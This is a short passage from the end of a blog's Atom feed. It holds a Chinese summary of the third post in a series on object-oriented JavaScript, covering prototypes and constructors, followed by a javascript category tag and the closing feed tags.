      &lt;p&gt;本系列是学习整理js中的面向对象的第3篇，原型和构造函数的关系，接下来就要更深入的探究其中的原理了。&lt;br&gt;
    
    </summary>
    
    
      <category term="javascript" scheme="https://evacoder.com/tags/javascript/"/>
    
  </entry>
  
</feed>
